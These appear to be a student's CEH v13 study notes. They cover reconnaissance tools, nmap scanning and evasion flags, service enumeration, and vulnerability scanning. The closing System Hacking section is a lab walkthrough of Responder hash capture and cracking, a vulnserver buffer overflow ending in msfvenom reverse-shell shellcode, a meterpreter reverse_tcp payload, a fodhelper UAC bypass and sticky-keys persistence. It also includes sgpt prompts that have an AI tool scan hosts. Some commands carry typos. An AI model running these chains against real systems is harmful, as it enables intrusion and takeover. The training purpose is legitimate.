# CEH-V13-Notes
# Footprinting and Reconnaissance

<details>
<summary>Google Search Engines</summary>   

* Popular Google advanced search operators :~
  - site: 
  - filetype: 
  - allinurl: 
  - inurl: 
  - intext:
  - allintitle: 
  - intitle: 
  - inanchor: 
  - allinanchor:
  - cache: 
  - link: 
  - location:

* Some Websites For Research Puspose :~
  - Google Hacking Database(Exploits Database)
    * Reconnaissance — find exposed pages, directories and entry points
    * Sensitive-data discovery — locate leaked credentials, backups, config files, logs
    * Attack-surface mapping — understand what an attacker could reach

    ```console 
        https://www.exploit-db.com/google-hacking-database
    ```
  - Shodan
    * Asset discovery — find internet-connected devices (cameras, routers, servers)
    * Exposure detection — spot devices with open ports or default/weak configs
    * Vulnerability spotting — identify services with known CVEs from banners 
    * Threat intelligence — see attacker-accessible targets and trends

    ```console
        https://www.shodan.io/dashboard
    ```    
</details>

<details>
<summary>Internet Research Services</summary>
  
* Finding a top level domains and Sub Domains :~
  - Netcraft
    * Hosting & IP info — current IP(s), ASN, and hosting provider
    * Server software & headers — web server (Apache, nginx, IIS), versions (if visible), HTTP headers
    * SSL/TLS details — cert issuer, expiry, SANs (subject alt names)
    * Technology hints — detected web technologies, frameworks, CMS (sometimes)
    * Phishing / takedown reports — Netcraft tracks phishing reports and can flag malicious sites
    * Reverse IP / virtual hosts — what other domains are hosted on the same IP (shared hosting)
    * Risk/Threat intelligence — in some paid tiers you get richer threat signals and aggregator data
    ```console
        https://www.netcraft.com/platform/threat-intelligence/reporting-and-dashboards
    ```    
</details>

<details>
<summary>Social Network Sites</summary>

* TheHarvester :~
  - Purpose: Passive information gathering / OSINT
  - Finds: email addresses, hostnames, subdomains, virtual hosts, employee names, and URLs from public sources
  - When to use: Early in reconnaissance/footprinting to enumerate targets and gather leads for further (authorized) testing
* Buzzsumo :~
  - Monitor public mentions (your company, products, executives)
  - Detect possible leaks / impersonations early
  - Collect OSINT for phishing or threat-intel training  
  ```console
      https://buzzsumo.com
  ```    
* Nmap :~
  - Nmap (Network Mapper) is an open-source security tool used to discover hosts and services on a computer network by sending packets and analyzing the responses
    * It shows what devices are on a network
    * Which ports/services they’re running
    * And helps test security & firewall rules
  - Nmap Types :~
    * Host-discovery / basic  
      * Ping scan (-sn) — discover live hosts without port scanning
        * Example: nmap -sn 192.168.1.0/24

    * TCP scans
      * SYN scan (half-open) (-sS) — fast, stealthy; preferred for stealthy port discovery
        * Example: nmap -sS 10.0.0.5

      * Connect scan (-sT) — uses full TCP connect(); use when you lack raw-socket privileges
        * Example: nmap -sT 10.0.0.5

      * TCP ACK (-sA) — map firewall rules / determine if ports are filtered
        * Example: nmap -sA target.com

      * Idle (Zombie) scan (-sI) — highly stealthy, uses a third-party "zombie" host to probe target
        * Example: nmap -sI zombie_ip target_ip

    * Special TCP flag scans (evade/troubleshoot)
      * FIN (-sF), NULL (-sN), Xmas (-sX) — firewall evasion / fingerprinting legacy stacks
        * Example: nmap -sF target.com

    * UDP & other protocol scans
      * UDP scan (-sU) — find UDP services (slower, noisy)
        * Example: nmap -sU -p 53,161 target.com
      
      * IP protocol scan (-sO) — discover which IP protocols (ICMP, IGMP, etc.) are supported
        * Example: nmap -sO target.com

    * Service & OS detection
      * Service/version detection (-sV) — identify service names and versions
        * Example: nmap -sV target.com

      * OS detection (-O) — attempt OS fingerprinting
        * Example: nmap -O target.com

      * Aggressive (-A) — OS + version + script scan + traceroute (all-in-one, noisy)
        * Example: nmap -A target.com

    * Scripting & vulnerability scans
      * NSE scripts (--script) — run scripts for discovery, vulnerability checks, brute force, etc
        * Example: nmap --script=vuln target.com or nmap --script=default,safe target.com

      * Service-specific scripts (e.g., --script smb*) — targeted checks

    * Scanning controls / evasion
      * Port range / all ports (-p 1-65535 or -p-) — scan specific or all ports

      * Disable host discovery (-Pn) — treat hosts as up (useful when ping is blocked)

      * Timing templates (-T0..-T5) — slow stealth (-T0) to fast (-T5)

      * Fragmentation (-f) / decoys (-D) / spoofing — evasion/obfuscation techniques (can be noisy or hostile)

    * IPv6 and other modes
      * IPv6 scanning — Nmap supports IPv6 targets (use IPv6 address directly)

      * SCTP scan (--sctp) — scan SCTP services if needed

* Sherlock :~
  - Sherlock is an open-source OSINT tool written in Python that helps you find usernames across many social networks and websites automatically
    - Username enumeration — check if a username exists on hundreds of sites at once
    - Digital footprinting — map a person’s or brand’s online presence.
    - Investigation support — gather publicly available info for threat intel, brand protection, or law-enforcement  work.
    - Reconnaissance for red-team/social engineering — identify where a target might have accounts (defensive use only)  
</details>

<details>
<summary>Whois Lookup Using Domain Tools</summary>

* Details About Whois Domain Tool :~
  - A WHOIS domain tool is an online service or command-line utility that lets you look up the public registration information of a domain name or IP address from WHOIS databases
    - Identify domain owners — find the registrant/organization behind a domain (unless privacy-protected)
    - Gather contact info — email/phone of the registrar or abuse contacts
    - Timeline checks — see when the domain was created/updated/when it expires
    - Detect suspicious domains — compare registration dates, patterns, and registrars to spot phishing or fake sites
    - Map infrastructure — see related domains, name servers, IPs
    - Incident response — get registrar abuse contacts to report malware or phishing
    ```console
        https://whois.domaintools.com/
    ```   
* IP2Location :~
  - IP2Location is a commercial / database & API service that maps an IP address to geographic and related metadata (country, region, city, ISP, latitude/longitude, time zone, proxy/VPN flags, ASN, domain, etc.)  
  ```console
      https://www.ip2location.com/
  ```      
</details> 

<details>
<summary>DNS Information using nslookup</summary>

* DNSDumpster :~
  - A free web-based reconnaissance tool that enumerates a domain’s DNS records and public attack surface and visualizes relationships (subdomains → IPs → netblocks). It scrapes DNS, CRT logs, public DNS servers, and passive sources to build a domain map
    - Quick subdomain discovery — find subdomains that might be forgotten (dev, staging, old service
    - DNS record snapshot — see A, AAAA, MX, NS, TXT, SOA, and PTR records in one view
    - Mapping & visualization — network graph showing hosts, IPs, and associated netblocks (great for reports)
    - Email infrastructure checks — reveals MX servers and mail hosts you should verify (SPF/DMARC gaps)
    - Public exposure spotting — discover exposed services, cloud-hosted assets and orphaned hosts
    - Triage & prioritization — fast way to find high-risk targets for further assessment (shodan, nmap)
    -  Evidence for incident response — timeline / snapshot useful when investigating domain-related incidents
    ```console
            https://dnsdumpster.com/
    ```    
* nslookup(using in cmd) :~
  - A command-line tool to query DNS records for a domain or IP
  - commands
    - nslookup
    - set type=a (a=A record)
    - www.certifiedhacker.com(domain name)
    - set type=cname
    - certifiedhacker.com(non-authoritative name)
    - set type=a(if we wnt the primary email ip address u can use it again)
    - enter primary email address
  - for example DNS records:
    - mx = for mail
    - ns = for servers
    - a = for ipv4
    - aaaa = for ipv6

* Kloth.net(website for nslookup and searching records) :~
  - Kloth.net is an online DNS lookup tool that allows users to query various DNS record types (A, MX, TXT, NS, etc.) for any domain from an external resolver, useful for passive reconnaissance and troubleshooting
      ```console
         https://www.kloth.net/
      ```   
* MXtoolbox(Find Domain Name) :~
  - MXToolbox is a free/commercial online toolkit for checking and troubleshooting email, DNS, and network services. It started as a “Mail eXchanger (MX) lookup” tool but now includes many tests
    - DNS lookups — A, AAAA, MX, TXT, SPF, DKIM, DMARC records
    - Blacklist checks — see if an IP/domain is on spam or malware blocklists
    - SMTP diagnostics — test mail servers, open relays, and routing problems
    - Domain health audits — one-click scan for common misconfigurations
    - Traceroute & ping — quick reachability tests
    - Whois / ASN info — see registrar and network details
    - Monitoring — continuous alerts if your mail server or DNS goes down or gets blacklisted
      ```console
          https://mxtoolbox.com/SuperTool.aspx?action=a%3agoogle.com&run=toolpage#
      ```
* DNS Record Types :~
  - A	- Maps a hostname to an IPv4 address
  - AAAA - Maps a hostname to an IPv6 address
  - CNAME	- Canonical Name — alias one name to another (e.g. www → example.com)
  - MX - Mail eXchanger — tells which servers handle email for the domain
  - NS - Name Server — lists the authoritative DNS servers for the domain
  - SOA - Start of Authority — contains admin info, serial numbers, refresh times for the zone
  - TXT -	Free-text data; commonly used for SPF, DKIM, DMARC, verification tokens          
</details>

<details>
<summary>Tracing Emails using eMailTrackerPro</summary>

* eMailTrackerpro :~
  - EmailTrackerPro is a web/email-tracking service that lets you track emails — who opened them, when, from what IP/location, which device, and what links were clicked. It usually works by embedding tracking pixels or tracked links in outgoing messages
  ```console
         https://emailtrackerpro.en.softonic.com/
  ```   
</details>

<details>
<summary>Footprinting a Target using Recon-ng</summary>

* Reon-ng :~
  - Recon-ng is an open-source web reconnaissance framework that automates OSINT gathering, helping security professionals collect, organize, and analyze information about domains, hosts, and people
  ```console
  - some commands
    - recon-ng  -  (for opening the recon in terminal)
    - marketplace install all  -  (where we are install all modules what we need)
    - workspace create workspacename  -  (this command we use for creating the workspace)
    - workspace load workspacename  -  (used for load existing workspace)
    - workspace remove workspacename  -  (for remove existing workspace)
    - db intert domains  -  (used to add the domain name)
    - modules load modulesname  -  (used for load the modules)
    - back  -  (used to come back to the privious module)
  ```
</details>

<details>
<summary>using sgpt</summary>
 
 * sgpt :~
  - sgpt is a small CLI (command-line) tool that lets you talk to OpenAI’s GPT (ChatGPT) from your terminal.
It’s basically a wrapper around the OpenAI API.
  - commands
    - sgpt "--------------" or
    - sgpt --chat nameofthetopic --shell "---------------"

</details>

<details>
<summary>Footprinting and Reconnaissance all tools in one frame</summary>

* Google dorks — like a metal detector that finds sensitive scraps buried in Google’s search results
* Google exploits (GHDB) — a cookbook of proven search recipes attackers use to uncover exposed secrets
* Shodan — a search engine that treats the Internet like a city and shows you every unlocked door and window
* Netcraft — a historical ledger that tells you who built a website, where it’s hosted, and how its ownership moved over time
* TheHarvester — a digital trawl net that scoops up public emails, hosts, and subdomains from the open web
* BuzzSumo — a social barometer that shows which headlines and posts make people react and share
* Nmap — an X-ray machine for networks that reveals which services and ports are alive under the skin
* Sherlock — a social media bloodhound that sniffs out where a username appears across the web
* Whois / DomainTools — the domain’s ID card showing who registered it and when
* IP2Location — a map app that pins an IP to a rough geographic and network address
* nslookup — a quick phonebook query to ask DNS “what’s the address for this name?”
* MXToolbox — a Swiss Army knife for checking email and DNS health at a glance
* Meltigo — (aggregator-style tool) a quick index that gathers scattered public traces of an email/username into one view
* Recon-ng — a modular assembly line that automates OSINT tasks and produces organized recon outputs
* DNS Dumpster — a satellite snapshot that maps a domain’s DNS landscape and forgotten subdomains
* Kloth.net — a simple external DNS lookup window you can use when your local resolver lies to you
* EmailTrackerPro — a tracker’s motion sensor that logs when an email is opened and from roughly where
* sgpt — a terminal-based assistant that brings ChatGPT into your shell like a pocket consultant

</details>


# Scanning Networks

<details>
<summary>Explain Network scanning concepts</summary>

* concepts :~
  - URG - Urgent
  - PUSH - push
  - ACK - Acknownledgment
  - FIN - finish
  - RST - reset
  - SYN - synchronice
</details>

<details>
<summary>Scanning Techniques for Host Discovery</summary>

* using Nmap :~
  - ICMP ping scan
    - ICMP Echo ping - nmap -sn -PE <target ip>
      - ICMP Echo ping sweep 
    - ICMP timestamp ping - nmap -sn -PP <target ip>
    -  ICMP address mak ping - nmap -sn -PM <target ip>
  - ARP ping scan - nmap -sn -PR <target ip>
  - UDP ping scan - nmap -sn -PU <target ip>
  - TCP ping scan
    - TCP SYN ping - nmap -sn -PS <target ip>
    - TCP ACK ping - nmap -sn -PA <target ip>
  - IP protocal ping scan - nmap -sn -PO <target ip> 
  - Ping sweep tools
    - Angry ip Scanner
    - Advance ip scanner
</details>

<details>
<summary>Scanning Techniques for Port and services</summary>

* port scanning techniques using Nmap :~
  - TCP Scanning
    - TCP full open scan - nmap -sT -v <target ip>
    - Stealth TCP scanning methods
      - Half-open scan - nmap -sS -v <target ip>
      - Inverse TCP flag Scan - nmap -(sF, sN, sX) -v <target ip>
        - Xmas scan - nmap -sX -v <target ip>
        - FIN scan - nmap -sF -v <target ip>
        - NULL scan - nmap -sN -v <target ip>
      - ACK flag probe scan - nmap -sA -v <target ip>
        - TTL-based scan - nmap -sA -ttl 100 -v <target ip>
        - window scan - nmap -sA -sW -v <target ip>
    - IDLE/IPID header scan - nmap -Pn -p- -sl<zombie><target>  
  - UDP scanning
  - SCTP scanning
    - SCTP INIT scanning - nmap -sY -v <target ip>
    - SCTP Cookie ECHO scanning - nmap -sZ -v <target ip>
  - SSDP scanning
  - IPv6 scanning
  - service version discovery - nmap -sV <target ip>
  - tool:
    - zenmap(you can use zenmap in windows as well as nmap in linux terminal)
</details>

<details>
<summary>Scanning techniques for OS Discovery</summary>

* Identify Target system OS :~
  - Linux = TTL(Time to live)-64
  - FreeBSD = TTL(Time to live)-64
  - OpenBSD = TTL(Time to live)-255
  - windows = TTL(Time to live)-128
  - Cisco Routers = TTL(Time to live)-255
  - Solaries = TTL(Time to live)-255
  - AIX = TTL(Time to live)-255
  
  - Command for OS Discovery :~ nmap -O <target ip>
  - nmap --script smb-os-discovery.nse <target ip>
</details>

<details>
<summary>Scanning Beyond IDS/Firewall using evasion Techniques</summary>

* Packet Fragmentation = nmap -f <target ip> 
* Source Routing
* Source port manupulation = nmap -g <port no> <target ip>
* IP Address Decoy
   - nmap -D RND(random namber of decoys):10 <target>
   - nmap -D decoy1, decoy2, decoy3,...etc
* IP Address Spoofing
  - using Hping3 for ip address spoofing = Hping3 www.certifiedhacker.com -a <target>
* MAC Address Spoofing = nmap -sT -Pn --spoof-mac <range like 0,1,2....> <target ip>
* Creating Custom
* Randomaizing host order and sending Bad checksums
  - randomized host order = nmap --randomize-hosts <target ip>
  - sending bad checksums = nmap --badsum <target ip>
* Proxy Servers 
* Anonymizers
* wireshark one filter = ip.src == <target ip> 
</details>

<details>
<summary>Scan a Target Network Using Metasploit</summary>

* Metasploit :~ 
  - commands :
  ```console 
             sudo su
             msfconsole
             nmap -Pn -sS -A -oX test <target ip range>
             search <module name>
             use <module name>
             set RHOSTS <ip range>
             set THREADS 50 or 10
  ```
</details>

# Enumeration
<details>
<summary>NetBIOS Enumeration</summary>

* Netbios :~ 
    netbios = network basic input and output system(port 137,138,139)
* NetBIOS Enumeration using Windows Command-Line Utilities :~
  - Commands:
    - net(this is for netbios help)
    - nbtstat -a <target system ip>
      - -a = displays the NetBIOS name table of a remote computer
    - nbtstat -c
      - -c = lists the contents of the NetBIOS name cache of the remote computer
</details>

<details>
<summary>Techniques for SNMP Enumeration and LDAP Enumeration</summary>

* SNMP = Simple Network Managment Protocol(port 161,162)
  - command : 
    - snmpwalk -v1 -c public <target ip>
    - nmap -sU -p 161 --script=snmp processes <target ip>

* SNMP Enumeration using SnmpWalk :~
 ```console 
      nmap -sU -p 161 --script=snmp-sysdescr <target ip>  
      nmap -sU -p 161 --script=snmp-processes <target ip>
      nmap -sU -p 161 --script=snmp-win32-software <target ip>
      nmap -sU -p 161 --script=snmp-interface <target ip> 
 ``` 

* SNMP Enumaretion using SNMPwalk with SGPT :~ 
  -     
* LDAP = Lightweight Directory Access Protocal :~
  - Using Active Directory Explorer (AD Explorer):
    - Tool: Active Directory Explorer
</details>

<details>
<summary>Techniques for NTP and NFS Enumaretion</summary>

* NTP = Network Time protocal
* NFS = Network File System
* NFS Enumeration using RPCScan and SuperEnum :~
  - NFS is for server to server file trasfor
  - superenum commands:
  ```console
      //make your user into superuser
      sudo su

      //you should make your current directory to superenum directory
      cd superenum

      nmap -p 2049 <target ip>

      //we should create one .txt file with target ip address
      echo "10.10.1.19">><txt file name with .txt>

      //this is for run the superenum
      ./superenum

      //after run the superenum we have to type the doc name or file name
      filename.txt
      
      //we complete the superenum and exit from superenum directory
      cd ..
  ```
  - RCP Scan Commands:
  ```console
      cd RPCscan(we sholud make your current directory to RPCscan directory)
      python3 rpc-scan.py <target ip> --rpc
  ```    


</details>

<details>
<summary>Demonstrate IPSec, VoIP, RPC, LInux/Unix, SMB</summary>

 * IPSec = Internet Protocal Security
 * VoIP = Voice Over Internet Protocal 
 * RPC = Remote Proedure Call 
 * SMB = Server Message Block(port TCP 445)

 //Additional info:
 * SAMBA = its used in linux/unix operating system and used for converting or help in file sharing and printers from one OS to Another OS like windows OS to Linux OS.
</details>

<details>
<summary> DNS Enumeration using Zone Transfer</summary>

* A DNS Zone Transfer is a mechanism used to copy DNS records from one DNS server (usually the master/primary) to another (secondary).
 - before we go for zone transfer first find out the Authoritative name sever for sending request
 - commands:
  ```console
       dig ns <domain name>
         dig = Domain Information Groper(this is a command in dns zone transfer in linux os system)
         NS = Name server

       dig @<server_name> <domain_name> <service>
       for example: dig @example.com www.certifiedhacker.com axfr
         @ = the @ symbol is used to specify the DNS server
         AXFR = A-Authoritative, XFR-transfer  

      //whether its fails go to windows server and perform nslookup in command promt
      nslookup
      set querytype=soa
      <domain_name>

      //whether it fails use this and make primary server into Authoritative server
      ls -d <primary server name>
  ```
</details>

<details>
<summary>SMTP Enumeration using Nmap</summary>

* SMTP = Simple Mail Transfer Protocal 
* Port = 25
* commands:
   ```console
    nmap -p 25 --script=smtp-enum-users <target_ip>
   ``` 
   ```console
    nmap -p 25 --script=smtp-open-relay <target_ip>
   ``` 
   ```console
    nmap -p 25 --script=smtp-commands <target_ip>
   ```  
</details>

<details>
<summary>Enumerate Information using Global Network Inventory and shellGPT</summary>

* Enumerate Information using Global Network Inventory :~
  - It’s a complete list (database) of all devices, systems, IPs, and services that exist on an organization’s entire network — across all branches, cloud, and local servers
* Tool: Global Network Inventory 
```console
  https://github.com/zeroday-studio/CEH-V13-notes.git
```  
* Enumeration Using SGPT :~
  - sgpt --shell "Perform NetBIOS enumeration on target IP 10.10.1.11"
  - sgpt --shell "Get NetBIOS info for IP 10.10.1.11 and display the associated names" 
  - sgpt --shell "Enumerate NetBIOS on target IP 10.10.1.22 with nmap"
  - sgpt --chat enum --shell "Perform SNMP enumeration on target IP 10.10.1.22 using SnmpWalk and display the result here"
  - sgpt --chat enum --shell "Perform SNMP enumeration on target IP 10.10.1.22 using nmap and display the result here"
  - sgpt --chat enum --shell "Perform SNMP processes on target IP 10.10.1.22 using nmap and display the result here"
  - sgpt --chat enum --shell "Perform SMTP enumeration on target IP 10.10.1.19."
  - sgpt --chat enum --shell "Use Nmap to perform DNS Enumeration on target domain www.certifiedhacker.com"
  - sgpt --chat enum --shell "Use dig command to perform DNS cache snooping on target domain www.certifiedhacker.com using recursive method. Use DNS server IP as 162.241.216.11"
  - sgpt --chat enum --shell "Use dig command to perform DNS cache snooping on the target domain www.certifiedhacker.com using non-recursive method. Use DNS server IP as 162.241.216.11"
  - sgpt --shell "Perform IPsec enumeration on target IP 10.10.1.22 with Nmap
  - sgpt --shell "Scan the target IP 10.10.1.22 for the port using SMB with Nmap"
  - sgpt --chat enum --shell "Develop and execute a script which will automate various network enumeration tasks on target IP range 10.10.1.0/24"
</details>

# Vulnerability Analysis
<details>
<summary>Summarize Vulnerability Assessment Concepts</summary>

* Classification of vulnerability :~
  - Mis/Weak Configuration
  - Application Flaws
  - poor path Managment
  - Design Flaws
  - Third-Party risks

* Vulnerability Scoring Systems and Database :~
  - CVSS = Common Vulnerability Scoring System
    - none - 0.0
    - Low - 0.1-3.9
    - Medium - 4.0-6.9
    - High - 7.0-8.9
    - Critical - 9.0-10.0
  - CVE = Common Vulnerability and Exposure
  - NVD = National Vulnerability Database
    - this is USA based Repository
  - CWE = Common Weakness Enumeration

* Vulnerability Management Lifecycle :~
  - Pre-Assessment phase
    - Identify Assets: we have to list which is very important in our network or our organization
    - Create a baseline: taking a snapshot of your systems current health before you start fixing anythig
  - Vulnerability Assessment phase
    - Vulnerability Scan: we have to scan our network or organization's vulnerability before we going to fix something
    - Vulnerability Analysis: we have to analys the vulnerability what we scan
  - post-assessment phase
    - Risk Assessment: Process of analysing and Prioritizing the vulnerabilities you discoverd and make sure which vulnerability containing more risk and we will go through that first
    - Remidiation: this step is for fixing, patching or removing the bugs in vulnerability
    - verification: we have to verify the process what we done now 
    - Monitoring: we have to monitor all steps and all the security option once we done all the steps

* Types of Vulnerability Scanning :~
  - External Scanning 
  - Internal Scanning 
  - Host-Based Scanning 
  - Network-Based Scanning
  - Application Scanning 
  - Credential Scanning 
  - Non-Credential Scanning
  - Manual Scanning
  - Automated Scanning    

* Analyze Vulnerability Assassment Reports :~
  - Executive Summary
  - Assessment overview
  - findings
  - Risk Assessment
  - Recommendations
  - Appendices and Supporting information
  - Conclusion
  - follow-up Actions and Timeline
  - Glossary of terms
</details>

<details>
<summary>Use Vulnerability Assessment Tools</summary>

* Tools :~
  - Nessus
  - Greenbone Security Assistant(OpenVAS)
  - Nikto(Coomand-line tool)
  - Equixly(AI-Powered Vulnerability Assessment Tool)
  - Smart Scanner(AI-Powered Vulnerability Assessment Tool)
  - skipfish(command-line tool)
  - Qualys
* Additional tools :~  
  -  InsightVM (https://www.rapid7.com)
  - Acunetix Web Vulnerability Scanner (https://www.acunetix.com)
  - Nexpose (https://www.rapid7.com)
  - Sniper (https://sn1persecurity.com)
  - Tripwire IP360 (https://www.tripwire.com)
  - SAINT Security Suite (https://www.carson-saint.com) 
  - BeSECURE (https://www.beyondsecurity.com) 
  - Core Impact Pro (https://www.coresecurity.com) 
  - Intruder (https://www.intruder.io) 
  - ManageEngine Vulnerability Manager Plus (https://www.manageengine.com) 
  - Astra Pentest (https://www.getastra.com) 
  - Skybox (https://www.skyboxsecurity.com) 
  - MaxPatrol TM (https://www.ptsecurity.com)
</details>

<details>
<summary>Vulnerability Analysis LABS</summary>

* Vulnerability Research in Common Weakness Enumeration (CWE) :~
  - website : 
  ```console
      https://cwe.mitre.org
  ```
* Vulnerability Analysis Using OpenVAS :~
  - Command: 
    //run this docker command to open the openvas in web browser
  ```console
    docker run -d -p 443:443 --name openvas mikesplain/openvas
  ```
  - website name : Greenbone security assistant
    //after run the docker command in linux os terminal use this ip address on web browser and after you will get openvas
  ```console
    IP Address: https://127.0.0.1
  ```
  
* Vulnerability Analysis Using ShellGPT :~
```console
  - sgpt --chat nikto --shell "launch nikto to execute a scan against the url www.certifiedhacker.com to identify potential vulnerabilities."
  - sgpt --chat nikto --shell "Scan the URL https://www.certifiedhacker.com to identify potential vulnerabilities with nikto"
  - sgpt --chat vuln --shell "perform a vulnerability scan on target url http://www.moviescope.com with nmap"
  - sgpt --chat vuln --shell "perform a vulnerability scan on target url http://testphp.vulnweb.com with skipfish"
```  
</details>     

# System Hacking
<details>
<summary>Gain Access to the System</summary>

* Perform Active Online Attack to Crack the System's Password using Responder :~
  - Responder listens on a network and tricks Windows systems into sending their login hashes, which can then be analyzed or cracked
  - we are using Responder tool for crack systems password
  - command:
    - open the terminal(linux)
    - sudo responder -I eth0(-I = Interface, eth0 = interface name)
    - go to the windows and login and open any admin login page or and login page
    - come back to the linux and copy jason hash in responder
    - pluma hash.txt(pluma is a text editor in linux)
    - john hash.txt (john is the tool using for crack the password its full name john ripper)
    - john the ripper will give the password in plan text using user hash

* Gain Access to a Remote System using Reverse Shell Generator :~
  - we using "shared directory (SMB)" for file transfor from host system to target system
  - we have to open reverse shell generator using Docker commands and mapping ports of host system port and docker container port
  - command:
    ```console
        docker run -d -p 80:80 reverse_shell_generator
    ```  
  - lsof -i :80 (shows which process is using port 80 on your system)
      - lsof = list open file
      - -i = internet connection
      - :80 = Filters the result to port 80 only
   - http://localhost(to open the reverse shell generator GUI)
   - step one is to create payload and listener using MSFVenom in reverse shell generator GUI and listner is msfconsole
   - step two is t create payload and listener using Hoaxshell for poweshell in reverse shell generator GUI (in target machine we have run this code in powershell terminal) 

* Perform Buffer Overflow Attack to Gain Access to a Remote System :~
  - Tools we are using:
    - vulnerable server
    - immunity debugger
  - EIP = Extended Instruction Pointer
  - ESP = Extended Stack Pointer  
  - in windows run vulnserver.exe as a administrator
  - run immune debugger as a administrator and attach vuln server to immune debugger and run this
  - sudo su and cd for root directory
  ```console
   //this command is used to make connection between host mechine and target server
    nc -nv <target ip> <target port> 
  ```  
    - nc = netcat 
    - -n = don't resolve the DNS 
    - -v = verbos   

  - First step is spiking step using spiking templets: 
    - pluma stats.spk
    ```console
      //we are inserting these three line code into stats.spk
        s_readline();
        s_string("STATS ");
        s_string_variable("0");
    ```
    ```console
        generic_send_tcp <target_ip> <target_port> <stats.spk_file> 0 0
    ```    
      - generic_send_tcp = its a spike templet or tool used to connect the tcp server
      - first 0 = starting position 
      - second 0 = delay(there is no delay between packets)
      - after the stats spiking exicution go to windows and check the immune debugger and vulnserver it was vulnerable or not wheather its vuln the immune debugger is pause it is not vuln means running
    
    - pluma trun.spk
    ```console
      //we are inserting these three line code into trun.spk
        s_readline();
        s_string("TRUN ");
        s_string_variable("0"); 
    ```
    ```console
        generic_send_tcp <target_ip> <target_port> <trun.spk_file> 0 0
    ``` 
      - after the stats spiking exicution go to windows and check the immune debugger and vulnserver it was vulnerable or not wheather its vuln the immunity debugger is pause it is not vuln means running

  - Second step is fuzzing using fuzz.py(using python script):
    - using shared directory we will copy script folder from windows to our system
    - go to the network option in our linux
    ```console
        smb://10.10.1.11
      //make your directory as script
        cd /home/attacker/Desktop/Scripts/
        chmod +x fuzz.py
        ./fuzz.py 
      //after this exicution go to windows and check immunity debugger the program is crached but EIP is not overwriten by the python script  
    ```
    - in this fuzzing method it will say vulnerable server crashed after receiving approximately 10200 bytes of data, but it did not overwrite the EIP register
    - After fuzzing and testing different values, it was found that sending 5100 bytes of data to the vulnerable application overwrites the EIP register.
    
  - Third step is Finding Offset using findoff.py and creating pattern for finding offset(using python script):
    - we get offset here = offset means The point where EIP gets overwritten  
    - run as administrator for vuln server and immunity debugger
    ```console
        //before finding offset you have create a pattern
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
    ``` 
    - copy the pattern of 10400 bytes whatever you want you can create and paste it in findoff.py
    ```console 
        pluma findoff.py
        chmod +x findoff.py
        ./findoff.py     
    ```
    - In the Immunity Debugger window, you can observe that the EIP register is overwritten with random bytes. Note down the random bytes in the EIP and find the offset of those byte
    - sudo su in new terminal and cd for root directory
    ```console
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337
    ```
    - -q = query
    - -l = length
    - you will get offset of that bytes

  - Fourth step is Overwrite EIP using overwrite.py:
    - using this method we make sure over EIP offset is correct or not
    - run as administrator for vuln server and immunity debugger
    ```console 
        chmod +x overwrite.py 
        ./overwrite.py
    ```
    - switch to the Windows 11 machine. You can observe that the EIP register is overwritten and EIP is showing as 42424242 
    - now we conform our offset is correct 
    - now we can go to control the EIP 

  - Fifth step is identify bad characters(because they may cause issues in the shellcode):
    - bad char might be stop our payloads also     
    - run as administrator for vuln server and immunity debugger 
    ```console  
        chmod -x badchars.py
        ./badchars.py
    ```    
    - In Immunity Debugger, click on the ESP register value -->right click on ESP and Follow in Dump option
    - ofter this there is not bad charectors
  
  - Sixth step is mona method:
    - run as administrator for vuln server and immunity debugger 
    - mona helps to identify the right module of the vulnerable server that is lacking memory protection
    - copy mona.py and paste it to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
    - in bottom of the immunity debugger you will get text box over their 
    - !mona modules(press enter)
    - you can see which module have no memory protection and we will exploit that module inject shellcode and take full control of the EIP register

  - Seventh step is converted using converter.py(we get Hex code):
    - run as administrator for vuln server and immunity debugger
    ```console  
        sudo su
        cd 
        python3 /home/attacker/converter.py  
        Enter the assembly code here : JMP ESP
      //you will get Hex code
        !mona find -s "\xff\xe4" -m essfunc.dll
      //you get the return address of the vulnerable module  
    ```  
    - In the Immunity Debugger window, click the Go to address in Disassembler icon and Enter expression to follow option and enter the return address in that box

  - Eigth step is jump usng jump.py
    - we can use this for jump from EIP to ESP
    - EIP register has been overwritten with the return address of the vulnerable module
    ```console
        chmod +x jump.py
        ./jump.py
    ```

  - Nighth Step is shell code method using shell code method:
    - first we have to create shell code using msfvenom(metasploit)
    ```console 
        msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
    ```
    - copy that shell code and paste that code into the shellcode.py
    ```console 
        pluma shellcode.py
      //we will run the Netcat command to listen on port in another terminal
        nc -nvlp <host_port>
        chmod +x shellcode.py (in first terminal)
        ./shellcode.py
    ```       
    - in listening port terminal shell access to the target vulnerable server has been established
</details>

<details>
<summary>Perform Privilege Escalation to Gain Higher Privileges</summary>

* Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys :~
  - we are exploiting Sticky keys feature to gain access and to escalate privileges on the target machine
  - switch to the Parrot Security machine and login with attacker/toor
  - sudo su and cd for root directory
  - run command for creating a payload:
   ```console
       msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
   ```
  - -f = file formate
  - > = store output in to this file  
  -  i want to share the payload from host system to target machine
  - to create share directory and give all owner permission to that directory:
   ```console
       //to create directory
       mkdir /var/www/html/share

       //to give full permission
       chmod -R 755 /var/www/html/share

       //to change user to owner
       chown -R www-data:www-data /var/www/html/share
   ```
  - Copy the payload into the shared folder by executing:
   ```console
       cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
   ```
  - Start the Apache server by executing 
   - service apache2 start
  - open metasploit framework and set payload and create listner for listening
   ```console
       msfconsole    
       use exploit/multi/handler
       set payload windows/meterpreter/reverse_tcp 
       set lhost <host_ip>
       set lport <host_port>
       run
   ```
  - switch back to the windows or target machine and Open any web browser
   - http://10.10.1.13/share
   -  download the file inside that directory 
  - switch to the Parrot Security machine and type
   - sysinfo
   - getuid

  - bypass the user account control setting(in metasploit)
  - background(this is for clearing the current sesssion)
  - search bypassuac(this is module)
  - we are using the fodhelper for this 
  - use exploit/windows/local/bypassuac_fodhelper
  - set session 1
  - show options
  - set LHOST <host_ip>
  - set TARGET 0
  - exploit 
  - getsystem -t 1
  - getuid
  - The BypassUAC exploit has successfully
  - background

  - we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11
   ```console
       use post/windows/manage/sticky_keys
       sessions -i*
       set session 2
       exploit
   ```
